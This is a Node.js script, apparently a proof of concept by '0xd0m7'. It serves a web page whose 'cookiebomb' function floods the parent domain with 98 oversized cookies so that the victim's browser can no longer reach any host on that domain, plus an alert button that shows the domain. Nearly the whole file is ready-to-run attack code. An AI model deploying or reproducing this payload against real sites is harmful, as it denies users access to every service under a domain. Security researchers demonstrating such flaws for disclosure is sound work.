const http = require('http');

const server = http.createServer((request, response) => {
    response.writeHead(200, {"Content-Type": "text/html"});
    response.end(`<html>
<script>
	function cookiebomb(){
		var d = document.domain.split(".").splice(-2).join(".");
		var pollution = Array(4000).join('a');
		for(var i=1;i<99;i++){
			document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
		}
		setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
	}
</script>
<h1>PoC by 0xd0m7</h1>
<button onclick="alert(document.domain)">Alert</button><br><br>
<button onclick="cookiebomb()">Cookie bomb</button>
</html>`);
});

const port = process.env.PORT || 1337;
server.listen(port);

console.log("Server running at http://localhost:%d", port);
